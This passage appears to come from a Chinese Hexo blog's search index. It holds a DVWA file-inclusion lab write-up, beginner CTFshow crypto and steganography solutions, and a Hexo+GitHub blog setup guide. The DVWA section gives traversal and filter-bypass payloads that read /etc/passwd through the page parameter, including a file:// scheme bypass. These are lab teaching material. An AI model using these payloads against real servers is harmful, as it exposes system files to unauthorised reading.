src="https://img-blog.csdnimg.cn/20210530202424774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>字段内容</strong><br><img src="https://img-blog.csdnimg.cn/20210530202439662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>DVWA文件包含漏洞-（中、高绕过）</title>
    <url>/2021/06/05/DVWA%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-%EF%BC%88%E4%B8%AD%E3%80%81%E9%AB%98%E7%BB%95%E8%BF%87%EF%BC%89/</url>
    <content><![CDATA[<p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">



<h1 id="一、DVWA-SecurityMedium級別"><a href="#一、DVWA-SecurityMedium級別" class="headerlink" title="一、DVWA SecurityMedium級別"></a>一、DVWA SecurityMedium級別</h1><p>设置好难度后，查看源码：<img src="https://img-blog.csdnimg.cn/2021052315344968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>通过对代码分析可以发现这里过滤了一些东西，即是<code>array</code>里面的因此我们需要进行绕过</p>
<p><strong>绕过方法</strong></p>
<ol>
<li><p>使用绝对路径或相对路径进行绕过，在这里与低级别中路径一致</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/DVWA-master/vulnerabilities/fi/?page=/etc/passwd</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210523161323887.png" alt="在这里插入图片描述"></p>
</li>
<li><p>使用的是 <code>str_replace() 函数</code>，可以使用重写的方式绕过或者是掺入大小写进行绕过</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><br><span class="hljs-number">1.</span> htthttp:<span class="hljs-comment">//p://</span><br><span class="hljs-number">2.</span> http:<span class="hljs-comment">//..././</span><br><span class="hljs-number">3.</span> ../<br></code></pre></td></tr></table></figure>
<h1 id="二、High-Security-Level"><a href="#二、High-Security-Level" class="headerlink" title="二、High Security Level"></a>二、High Security Level</h1><p>查看源码：<br><img src="https://img-blog.csdnimg.cn/20210523154828740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看出，报错的条件：</p>
<ol>
<li>传出的<code>page</code>中没有<code>file*</code></li>
<li>$file不等于<code>Include.php</code></li>
</ol>
<p><strong>绕过方法：</strong></p>
<ol>
<li>可以使用伪协议进行绕过:<code>file://</code></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/DVWA-master/vulnerabilities/fi/?page=file:///etc/passwd</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210523160332867.png" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>CTFshow-萌新</title>
    <url>/2021/06/05/CTFshow-%E8%90%8C%E6%96%B0/</url>
    <content><![CDATA[<h1 id="萌新-密码2"><a href="#萌新-密码2" class="headerlink" title="萌新_密码2"></a>萌新_密码2</h1><p><img src="https://img-blog.csdnimg.cn/20210410095649144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="&lt;font color=#999AAA &gt;示例：pandas 是基于NumPy 的一种工具，该工具是为了解决数据分析任务而创建的。"><br>那就敲一下键盘试一下，每六个字符一组，你会发现六个字符中间正好包围起来一个字符即所找的flag答案依次拼接：FWY</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs sql">因此KEY&#123;fwy&#125;<br></code></pre></td></tr></table></figure>

<h1 id="萌新-密码3"><a href="#萌新-密码3" class="headerlink" title="萌新 密码3"></a>萌新 密码3</h1><p><img src="https://img-blog.csdnimg.cn/20210410100036735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解题思路：</p>
<ul>
<li>一串摩斯电码</li>
<li>看到培根，可以想到培根密码</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20210410100313789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>继续培根解密</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">培根密码，又名倍康尼密码（英语：Bacon’s cipher）是由法兰西斯·培根发明的一种隐写术。<br></code></pre></td></tr></table></figure>
<p>因此需要将得到的密码进行转换试着将M-A,D-B或者反过来</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">AABBABABAAABBBABABBAAAAAAABBABAABBA<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210410100717629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到KEY{guowang}</p>
<h1 id="萌新-隐写2"><a href="#萌新-隐写2" class="headerlink" title="萌新 隐写2"></a>萌新 隐写2</h1><p><img src="https://img-blog.csdnimg.cn/20210410100834590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载文件后发现这是一个加密文件因此我们需要对其进行解密<img src="https://img-blog.csdnimg.cn/20210410100950591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里我们使用ZIPerello对其破解<br>先从都是数字进行尝试<img src="https://img-blog.csdnimg.cn/20210410102343631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>输入密码得到FLAG<img src="https://img-blog.csdnimg.cn/20210410102551594.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="萌新-隐写4"><a href="#萌新-隐写4" class="headerlink" title="萌新 隐写4"></a>萌新 隐写4</h1><p><img src="https://img-blog.csdnimg.cn/20210410102717271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/2021041010273422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>根据提示，可以想到也许图片里面的隐藏信息被隐藏了呢<img src="https://img-blog.csdnimg.cn/20210410102941309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>打开可选隐藏文字<img src="https://img-blog.csdnimg.cn/2021041010301292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>得到flag{word_stega}</p>
<h1 id="萌新-密码-4"><a href="#萌新-密码-4" class="headerlink" title="萌新 密码#4"></a>萌新 密码#4</h1><p><img src="https://img-blog.csdnimg.cn/20210410103207470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>通过分析先使用base64进行<img src="https://img-blog.csdnimg.cn/2021041010330027.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再进行base85<img src="https://img-blog.csdnimg.cn/20210410103516129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>会发现解码不全，有点尴尬去找了大佬们的解题解释：<img src="https://img-blog.csdnimg.cn/20210410103549657.png" alt="在这里插入图片描述"><br>进行转换后正确的代码是：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">Ao(mgHX^E)ARAnTF(J]f@&lt;6&quot;.<br></code></pre></td></tr></table></figure>
<p>得到<img src="https://img-blog.csdnimg.cn/20210410103642609.png" alt="在这里插入图片描述"></p>
<h1 id="萌新-隐写3"><a href="#萌新-隐写3" class="headerlink" title="萌新 隐写3"></a>萌新 隐写3</h1><p><img src="https://img-blog.csdnimg.cn/20210410103728114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>这个题有点水，打开图片就得到了flag<img src="https://img-blog.csdnimg.cn/20210410103803269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="杂项1"><a href="#杂项1" class="headerlink" title="杂项1"></a>杂项1</h1><p><img src="https://img-blog.csdnimg.cn/20210410103841439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>文本中提到了md5因此我们使用MD5进行解密：<br><img src="https://img-blog.csdnimg.cn/20210410104213729.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据提示得到flag{hello}</p>
<h1 id="杂项2"><a href="#杂项2" class="headerlink" title="杂项2"></a>杂项2</h1><p><img src="https://img-blog.csdnimg.cn/2021041010434148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210410104431643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>对于图片可以考虑使用WINHEX<img src="https://img-blog.csdnimg.cn/20210410104615762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>在文本末端发现了flag{ctfshow_im_coming}</p>
<h1 id="萌新-杂项3"><a href="#萌新-杂项3" class="headerlink" title="萌新 杂项3"></a>萌新 杂项3</h1><p><img src="https://img-blog.csdnimg.cn/20210410104723688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>直接动脑子吧，根据提示生日数字加上小五：<strong>971015</strong></p>
<h1 id="杂项4"><a href="#杂项4" class="headerlink" title="杂项4"></a>杂项4</h1><p><img src="https://img-blog.csdnimg.cn/20210410104917115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>老样子直接破解吧，可见这是九位数字前三位是：372</p>
<p><img src="https://img-blog.csdnimg.cn/2021041011004621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到FLAG<br><img src="https://img-blog.csdnimg.cn/20210410110123480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="杂项5"><a href="#杂项5" class="headerlink" title="杂项5"></a>杂项5</h1><p><img src="https://img-blog.csdnimg.cn/20210410110209488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210410110248260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>是不是看起来很没用头绪，没关系认真看：是不是某个单词中的字母会突然变成了大写！！！没错，将所有大写字母拼接起来就是我们所求的flag</p>
<p><img src="https://img-blog.csdnimg.cn/20210410110458600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">找下去FLAG&#123;CTFSHOWNB&#125;<br></code></pre></td></tr></table></figure>
<h1 id="杂项6"><a href="#杂项6" class="headerlink" title="杂项6"></a>杂项6</h1><p><img src="https://img-blog.csdnimg.cn/20210410110644886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>我这里直接得到了FLAG可能是压缩软件比较强大<br><img src="https://img-blog.csdnimg.cn/20210410110706590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="隐写1"><a href="#隐写1" class="headerlink" title="隐写1"></a>隐写1</h1><p><img src="https://img-blog.csdnimg.cn/20210410110815888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210410110846929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打不开，保存下来用WINHEX打开<img src="https://img-blog.csdnimg.cn/20210410111007817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>可以发现头文件出错进行修改保存后打开<img src="https://img-blog.csdnimg.cn/20210410111035795.png" alt="在这里插入图片描述"></p>
<p>得到flag<img src="https://img-blog.csdnimg.cn/20210410111103838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="隐写2"><a href="#隐写2" class="headerlink" title="隐写2"></a>隐写2</h1><p><img src="https://img-blog.csdnimg.cn/20210410111133457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210410111159648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>下载工具打开图片<img src="https://img-blog.csdnimg.cn/20210410111553318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>直接点🆗然后<img src="https://img-blog.csdnimg.cn/20210410111706642.png" alt="在这里插入图片描述"></p>
<p>保存后打开得到flag<img src="https://img-blog.csdnimg.cn/20210410111722181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="萌新隐写5"><a href="#萌新隐写5" class="headerlink" title="萌新隐写5"></a>萌新隐写5</h1><p><img src="https://img-blog.csdnimg.cn/20210410111856710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>先想到了中文转Unicode编码<img src="https://img-blog.csdnimg.cn/20210410112018685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">\u4d00\u5a00\u5700\u4700\u4300\u5a00\u5a00\u4900\u4e00\u4200\u5100\u5700\u3600\u5800\u3300\u4b00\u4e00\u4600\u3200\u5600\u3600\u5900\u5400\u5600\u4c00\u3500\u3400\u5700\u3600\u3300\u5400\u4800\u4c00\u3500\u5200\u4400\u4700\u4d00\u5300\u3700\u4600\u4500\u3d00\u3d00\u3d00\u3d00\u3d00\u3d00\u005c\u005c\u003d\u3002\u003d\u002f\u002f<br></code></pre></td></tr></table></figure>
<p>然后是16进制转字符<img src="https://img-blog.csdnimg.cn/20210410112052157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">MZWGCZZINBQW6X3KNF2V6YTVL54W63THL5RDGMS7FE======<br></code></pre></td></tr></table></figure>
<p>再用base32解密<img src="https://img-blog.csdnimg.cn/20210410112303960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">flag(hao_jiu_bu_yong_b32_)<br><br></code></pre></td></tr></table></figure>
<h1 id="萌新隐写6"><a href="#萌新隐写6" class="headerlink" title="萌新隐写6"></a>萌新隐写6</h1><p><img src="https://img-blog.csdnimg.cn/20210410112415879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>打开后是一段音频<br>用Audacity打开<img src="https://img-blog.csdnimg.cn/2021041011261299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现左声道是摩斯电码，这里给出一个大佬们用的<a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html">摩斯电码音频解码工具</a><br>导出为MP3或者wav格式<br>打开工具，进行解密<img src="https://img-blog.csdnimg.cn/20210410113517332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>得到flag</p>
]]></content>
  </entry>
  <entry>
    <title>Hexo+github搭建个人博客</title>
    <url>/2021/01/30/Hexo+Github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天的文章主要记录了如何利用Hexo+Github搭建一个自己的博客，作为一个小白不得不说这个过程真的是欲哭无泪。</p>
<h1 id="一、前期准备工作"><a href="#一、前期准备工作" class="headerlink" title="一、前期准备工作"></a>一、前期准备工作</h1><p>nodejs: 包含俩个命令 node npm</p>
<p>hexo: 快速、简洁且高效的博客框架,支持markdown 插件和扩展性很好</p>
<p>git：需要安装git 通过git 命令来操作github</p>
<p>github账号：申请注册一个github账号，github提供了一个github pages功能可以支持站点</p>
<h1 id="二、博客的搭建以及部署"><a href="#二、博客的搭建以及部署" class="headerlink" title="二、博客的搭建以及部署"></a>二、博客的搭建以及部署</h1><h2 id="1-nodejs-以及Git的安装"><a href="#1-nodejs-以及Git的安装" class="headerlink" title="1.nodejs 以及Git的安装"></a>1.nodejs 以及Git的安装</h2><p>需要使用Git安装，进入官方网址下载：<a href="https://git-scm.com/download/win">这里是Windows用户地址</a><br>下载完成之后点击安装，然后通过打开Git Bash 这个软件来执行的命令，由于为了之后加快安装hexo速度，更换为国内的npm源：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">npm config <span class="hljs-built_in">set</span> registry https:<span class="hljs-comment">//registry.npm.taobao.org</span><br>npm config get registry<br>看看终端显示信息，如果看到这行信息，说明配置成功: https:<span class="hljs-comment">//registry.npm.taobao.org/</span><br></code></pre></td></tr></table></figure>
<p>下载安装 然后通过命令检测下安装版本<br>下载地址： <a href="https://npm.taobao.org/mirrors/node/v12.20.0/">https://npm.taobao.org/mirrors/node/v12.20.0/</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">$ node -v<br>(base)<br>$ npm -v<br></code></pre></td></tr></table></figure>
<p>临时更换npm 源 (为了后面快速下载安装hexo，更换为国内的源)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">$ npm config <span class="hljs-built_in">set</span> registry https:<span class="hljs-comment">//registry.npm.taobao.org</span><br>$ npm config get registry<br>https:<span class="hljs-comment">//registry.npm.taobao.org/</span><br></code></pre></td></tr></table></figure>
<h2 id="2-github注册"><a href="#2-github注册" class="headerlink" title="2.github注册"></a>2.github注册</h2><p><a href="https://github.com/join?ref_cta=Sign%20up&ref_loc=header%20logged%20out&ref_page=/&source=header-home">这里是github 注册地址</a><br><img src="https://img-blog.csdnimg.cn/20210129231024102.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>新建一个仓库<br><img src="https://img-blog.csdnimg.cn/20210129231246925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210129231345582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后打开仓库创建一个 index.html 文件，并添加内容。<br><img src="https://img-blog.csdnimg.cn/20210129231615114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2021012923170181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>创建站点后，index html的效果只是暂时的。后期需要hexo部署到你的Github上就可以生成自己的博客。</p>
<h2 id="3-GithubSHH配置"><a href="#3-GithubSHH配置" class="headerlink" title="3.GithubSHH配置"></a>3.GithubSHH配置</h2><p>首先打开Git-Bash工具 ，执行命令</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">git config --global user.name <span class="hljs-string">&quot;用户名&quot;</span><br>git config --global user.email <span class="hljs-string">&quot;邮箱地址&quot;</span><br></code></pre></td></tr></table></figure>
<p>（注意这里填写注册github时所使用的用户名和邮箱地址）<br>生成一对密钥 SSH key</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">ssh-keygen -t rsa -C <span class="hljs-string">&quot;你的邮箱地址&quot;</span><br></code></pre></td></tr></table></figure>
<p>执行后一直敲回车键就可以了<br><img src="https://img-blog.csdnimg.cn/20210129232724928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>首次使用需要检测是否成功：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">ssh -T git@github.com<br></code></pre></td></tr></table></figure>
